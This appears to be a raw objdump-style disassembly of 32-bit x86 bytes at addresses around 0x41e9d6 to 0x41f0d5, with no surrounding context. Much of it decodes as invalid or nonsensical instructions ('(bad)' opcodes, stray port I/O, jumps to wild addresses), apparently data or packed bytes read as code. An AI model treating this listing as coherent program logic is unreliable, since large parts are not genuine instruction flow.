  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0xaacc78e9
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [edx-0x68fffffa],al
  41edc3:	sub    esp,edx
  41edc5:	cmp    al,0x4e
  41edc7:	sbb    DWORD PTR ds:[ebp-0x1d57366b],edx
  41edce:	xor    BYTE PTR ds:0x36d963c0,cl
  41edd4:	nop
  41edd5:	int    0xb7
  41edd7:	mov    ebx,0xecd02cbc
  41eddc:	fsub   QWORD PTR [edi+0x819f664]
  41ede2:	out    dx,al
  41ede3:	cmp    eax,0x618a287f
  41ede8:	popa   
  41ede9:	add    ah,BYTE PTR [edi]
  41edeb:	mov    BYTE PTR [edi],dl
  41eded:	clc    
  41edee:	mov    esp,0xe5fd1662
  41edf3:	dec    edx
  41edf4:	sbb    eax,0x3b213370
  41edf9:	mov    ds:0x96a789d5,eax
  41edfe:	pop    ecx
  41edff:	fadd   st(7),st
  41ee01:	adc    eax,0x94f3e5cd
  41ee06:	push   ss
  41ee07:	out    dx,al
  41ee08:	out    0x53,al
  41ee0a:	push   eax
  41ee0b:	push   edi
  41ee0c:	add    BYTE PTR [esi+0x2c],0xb9
  41ee10:	les    edi,FWORD PTR [ecx-0x6bb42e21]
  41ee16:	into   
  41ee17:	in     eax,0x1d
  41ee19:	imul   eax,ebp,0x2b645de0
  41ee1f:	xor    al,0xe7
  41ee21:	mov    edi,0xddfd7da7
  41ee26:	jne    0x41ee3a
  41ee28:	push   es
  41ee29:	sub    DWORD PTR [ebx-0x18],eax
  41ee2c:	les    ebp,FWORD PTR [esi]
  41ee2e:	lods   eax,DWORD PTR ds:[esi]
  41ee2f:	fdiv   QWORD PTR [eax]
  41ee31:	daa    
  41ee32:	push   ecx
  41ee33:	jecxz  0x41ee80
  41ee35:	jge    0x41eea6
  41ee37:	scas   eax,DWORD PTR es:[edi]
  41ee38:	cdq    
  41ee39:	test   al,0xee
  41ee3b:	mul    DWORD PTR [edx]
  41ee3d:	or     ch,BYTE PTR [ecx+0x11]
  41ee40:	cmp    eax,0x2bc917aa
  41ee45:	xor    BYTE PTR [ebx+0x6242064e],ch
  41ee4b:	pop    ebx
  41ee4c:	or     bh,BYTE PTR ds:0x9ab6437f
  41ee52:	daa    
  41ee53:	push   es
  41ee54:	inc    esi
  41ee55:	cli    
  41ee56:	xor    BYTE PTR [ebp+0x10],ah
  41ee59:	jo     0x41ee1f
  41ee5b:	inc    eax
  41ee5c:	xor    eax,0x3d1bdb81
  41ee61:	mov    WORD PTR [edi-0x2e],?
  41ee64:	out    dx,al
  41ee65:	jbe    0x41eed6
  41ee67:	inc    esi
  41ee68:	jg     0x41ee01
  41ee6a:	imul   esp,esp,0xffffffec
  41ee6d:	fistp  QWORD PTR [esi-0x5fe068af]
  41ee73:	adc    al,0xfb
  41ee75:	or     eax,DWORD PTR [ecx+ecx*1+0x5d]
  41ee79:	repz mov eax,0x2314e4d2
  41ee7f:	jge    0x41eecc
  41ee81:	es push 0xdd4bb3ac
  41ee87:	mov    WORD PTR [ecx+ecx*4-0x39],ds
  41ee8b:	popf   
  41ee8c:	push   cs
  41ee8d:	xor    edx,eax
  41ee8f:	sub    DWORD PTR [ebp+0x7a6d2825],esp
  41ee95:	clc    
  41ee96:	jne    0x41eea3
  41ee98:	jl     0x41ee59
  41ee9a:	and    eax,0x5dfa4cdb
  41ee9f:	ret    
  41eea0:	fisub  WORD PTR [ebx-0x23]
  41eea3:	mov    ds:0xec453158,eax
  41eea8:	clc    
  41eea9:	and    ah,BYTE PTR [ebx]
  41eeab:	jge    0x41ee3b
  41eead:	sbb    cl,bh
  41eeaf:	xlat   BYTE PTR ds:[ebx]
  41eeb0:	sbb    esp,DWORD PTR [ebp-0x622dcb9f]
  41eeb6:	aaa    
  41eeb7:	(bad)  
  41eeb8:	pop    ebx
  41eeb9:	in     eax,dx
  41eeba:	sbb    ah,BYTE PTR [esi]
  41eebc:	je     0x41eeaf
  41eebe:	jbe    0x41ee98
  41eec0:	xor    esp,DWORD PTR [esi-0x67]
  41eec3:	xor    eax,0x7c678bff
  41eec8:	in     eax,dx
  41eec9:	aaa    
  41eeca:	pop    edx
  41eecb:	pop    ds
  41eecc:	lock mov ecx,0x62291a66
  41eed2:	mov    bl,0xfe
  41eed4:	lods   al,BYTE PTR ds:[esi]
  41eed5:	xchg   BYTE PTR [esi-0x3e2c3a14],dl
  41eedb:	adc    DWORD PTR [ebx],edi
  41eedd:	mov    al,0xca
  41eedf:	sbb    bh,al
  41eee1:	int3   
  41eee2:	aaa    
  41eee3:	and    edx,esp
  41eee5:	mov    dl,0xc1
  41eee7:	ins    BYTE PTR es:[edi],dx
  41eee8:	mov    eax,ds:0x929122cf
  41eeed:	dec    esp
  41eeee:	mov    WORD PTR ds:0x2f56b400,cs
  41eef4:	ror    DWORD PTR [ebx+0x9],1
  41eef7:	pop    es
  41eef8:	scas   al,BYTE PTR es:[edi]
  41eef9:	aaa    
  41eefa:	pop    es
  41eefb:	aas    
  41eefc:	cmp    DWORD PTR [ebx],esi
  41eefe:	out    0x64,eax
  41ef00:	pop    ds
  41ef01:	adc    al,0x18
  41ef03:	add    ebx,esp
  41ef05:	lahf   
  41ef06:	sub    DWORD PTR [eax],ebp
  41ef08:	lods   al,BYTE PTR ds:[esi]
  41ef09:	mov    dl,0x49
  41ef0b:	adc    edx,DWORD PTR [eax-0x62eb6261]
  41ef11:	mov    esp,0x6fa7e7b6
  41ef16:	jmp    0x41eed7
  41ef18:	jp     0x41eee3
  41ef1a:	adc    DWORD PTR [ecx-0x41],0xffffffb4
  41ef1e:	ret    0xfd41
  41ef21:	cmp    esp,ebp
  41ef23:	aam    0x18
  41ef25:	or     dh,ah
  41ef27:	enter  0xcc58,0x50
  41ef2b:	fstp   DWORD PTR [ecx+0x7a]
  41ef2e:	pop    esi
  41ef2f:	xchg   edi,esp
  41ef31:	into   
  41ef32:	sub    BYTE PTR [eax],cl
  41ef34:	adc    bh,BYTE PTR [esi]
  41ef36:	push   cs
  41ef37:	je     0x41ef62
  41ef39:	sbb    ebp,DWORD PTR [esi]
  41ef3b:	test   DWORD PTR [eax+0x59],esi
  41ef3e:	add    eax,0x936fed66
  41ef43:	dec    edi
  41ef44:	jno    0x41eed3
  41ef46:	and    DWORD PTR [ecx+0x220b0e5c],esp
  41ef4c:	loope  0x41eeda
  41ef4e:	mov    eax,0x4498a427
  41ef53:	arpl   WORD PTR [ecx+0x6b6b88fb],cx
  41ef59:	int    0x1f
  41ef5b:	dec    ecx
  41ef5c:	mov    bh,0x89
  41ef5e:	sub    BYTE PTR [edi],bl
  41ef60:	ret    
  41ef61:	rol    DWORD PTR [ebx],1
  41ef63:	mov    esp,esp
  41ef65:	inc    edx
  41ef66:	mov    dh,0x92
  41ef68:	push   ss
  41ef69:	inc    ecx
  41ef6a:	cdq    
  41ef6b:	ds adc eax,0x64324012
  41ef71:	jp     0x41efcb
  41ef73:	sbb    bh,BYTE PTR [esi-0x12]
  41ef76:	adc    DWORD PTR [edx+0x60],ecx
  41ef79:	sub    dh,BYTE PTR [ecx+0x8017214]
  41ef7f:	cmp    bl,BYTE PTR [edi-0x9]
  41ef82:	xor    BYTE PTR [ebx+0x56],bh
  41ef85:	xchg   DWORD PTR [edi-0x37f8fe58],esp
  41ef8b:	inc    ebx
  41ef8c:	mov    ebp,0xbf422160
  41ef91:	pop    esp
  41ef92:	aas    
  41ef93:	imul   ecx,edi,0xcb5183b3
  41ef99:	jge    0x41ef8e
  41ef9b:	pusha  
  41ef9c:	ror    dh,1
  41ef9e:	cwde   
  41ef9f:	(bad)  
  41efa0:	pop    edi
  41efa1:	xchg   ecx,eax
  41efa2:	test   DWORD PTR ss:[esi-0x7166320d],0xbc73579c
  41efad:	cmc    
  41efae:	add    edi,DWORD PTR [esi+ebp*2-0x5a]
  41efb2:	pop    es
  41efb3:	dec    esi
  41efb4:	dec    edi
  41efb5:	mov    cl,0x7e
  41efb7:	xor    edi,DWORD PTR [eax+0x36c6d911]
  41efbd:	call   0xd389:0xa1f121e8
  41efc4:	and    esp,DWORD PTR [ebp+0x51]
  41efc7:	pop    ebp
  41efc8:	pop    ds
  41efc9:	outs   dx,DWORD PTR ds:[esi]
  41efca:	sahf   
  41efcb:	mov    al,ds:0x6a65bbf4
  41efd0:	(bad)  
  41efd1:	int    0x55
  41efd3:	pop    ecx
  41efd4:	repnz sbb DWORD PTR [esi-0x417d8411],eax
  41efdb:	addr16 (bad) 
  41efdd:	shl    DWORD PTR [ecx],cl
  41efdf:	stos   BYTE PTR es:[edi],al
  41efe0:	ficom  WORD PTR [eax-0x59d27605]
  41efe6:	inc    esp
  41efe7:	les    esi,FWORD PTR [ebx]
  41efe9:	xor    al,0xab
  41efeb:	stos   BYTE PTR es:[edi],al
  41efec:	sbb    al,0xf5
  41efee:	push   ebp
  41efef:	dec    eax
  41eff0:	and    eax,0x16dfb80a
  41eff5:	push   ecx
  41eff6:	in     al,dx
  41eff7:	xchg   ecx,eax
  41eff8:	or     al,0x4c
  41effa:	pop    edx
  41effb:	adc    edx,ebp
  41effd:	sub    bl,BYTE PTR [edx]
  41efff:	hlt    
  41f000:	jb     0x41f07c
  41f002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f003:	pop    ds
  41f004:	mov    cl,0x88
  41f006:	icebp  
  41f007:	pop    es
  41f008:	jmp    0x41f00e
  41f00a:	ror    ecx,1
  41f00c:	dec    eax
  41f00d:	cmp    cl,BYTE PTR [edi]
  41f00f:	les    ebx,FWORD PTR [eax-0x32409e52]
  41f015:	mov    ch,0x7a
  41f017:	ins    DWORD PTR es:[edi],dx
  41f018:	or     al,0x58
  41f01a:	(bad)  
  41f01b:	rcl    ch,1
  41f01d:	inc    esi
  41f01e:	jmp    0x65b3:0x3a3b86e2
  41f025:	imul   esi,DWORD PTR [edi+0x4fe2a484],0xffffffe2
  41f02c:	dec    eax
  41f02d:	stc    
  41f02e:	(bad)  
  41f030:	add    BYTE PTR ds:0xa43fc1a,bl
  41f036:	js     0x41f06e
  41f038:	repnz adc ebx,edi
  41f03b:	mov    ecx,edi
  41f03d:	popf   
  41f03e:	outs   dx,DWORD PTR ds:[esi]
  41f03f:	jne    0x41efe3
  41f041:	jp     0x41f07f
  41f043:	sub    eax,0xcc8b4cee
  41f048:	test   BYTE PTR [ebp+0x3],bl
  41f04b:	jp     0x41f003
  41f04d:	addr16 mov eax,0x93c8bc6b
  41f053:	or     BYTE PTR [ecx-0x7c],bl
  41f056:	sbb    DWORD PTR [edi],0xed32c9e0
  41f05c:	jo     0x41f0b4
  41f05e:	mov    bh,0xdb
  41f060:	aam    0x41
  41f062:	xchg   edx,eax
  41f063:	xor    BYTE PTR [ebp+0x29],0x1d
  41f067:	jmp    0x6fe8ea2
  41f06c:	xlat   BYTE PTR ds:[ebx]
  41f06d:	mov    ebx,0xd85d9197
  41f072:	xor    eax,0x9b47c02e
  41f077:	repnz add eax,0xb95719a7
  41f07d:	mov    dh,0x3e
  41f07f:	pop    esi
  41f080:	sbb    ebp,DWORD PTR [ebp-0x16]
  41f083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f084:	(bad)
  41f087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f088:	out    0x51,al
  41f08a:	cmp    DWORD PTR [edx+0x5bd39acb],edi
  41f090:	xchg   edx,eax
  41f091:	into   
  41f092:	jle    0x41f0ba
  41f094:	pop    es
  41f095:	sub    ebp,0xffffffca
  41f098:	outs   dx,DWORD PTR ds:[esi]
  41f099:	pop    esp
  41f09a:	push   es
  41f09b:	xchg   edi,eax
  41f09c:	idiv   bh
  41f09e:	ss pop esi
  41f0a0:	cmp    eax,0x97ec6a86
  41f0a5:	jg     0x41f0e3
  41f0a7:	out    dx,al
  41f0a8:	dec    ebx
  41f0a9:	iret   
  41f0aa:	popa   
  41f0ab:	int3   
  41f0ac:	cmc    
  41f0ad:	pop    es
  41f0ae:	pop    esi
  41f0af:	jnp    0x41f0ed
  41f0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b2:	imul   esp,DWORD PTR [esi],0xde779772
  41f0b8:	adc    DWORD PTR [eax+0x38c2753f],0xffffff83
  41f0bf:	int3   
  41f0c0:	jo     0x41f127
  41f0c2:	mov    ecx,esi
  41f0c4:	sbb    DWORD PTR [edi-0x18f9272],ebp
  41f0ca:	push   ecx
  41f0cb:	ins    DWORD PTR es:[edi],dx
  41f0cc:	adc    DWORD PTR [ebp-0x52825214],eax
  41f0d2:	retf   0x8204
  41f0d5:	outs   dx,BYTE PTR ds:[esi]
